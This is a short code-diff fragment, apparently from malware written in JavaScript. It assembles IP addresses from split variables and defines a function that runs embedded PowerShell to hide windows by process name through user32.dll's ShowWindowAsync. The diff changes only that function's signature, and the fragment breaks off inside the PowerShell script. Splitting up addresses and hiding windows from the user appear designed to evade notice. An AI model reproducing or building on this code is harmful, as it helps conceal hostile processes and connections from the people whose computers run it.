@@ -28,7 +28,7 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    function hideWindowByProcessName(name) {
+    function hideWindowByProcessName() {
         const psScript = `
             Add-Type 'using System; using System.Runtime.InteropServices; public static class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }';
             $SW_HIDE = 0;
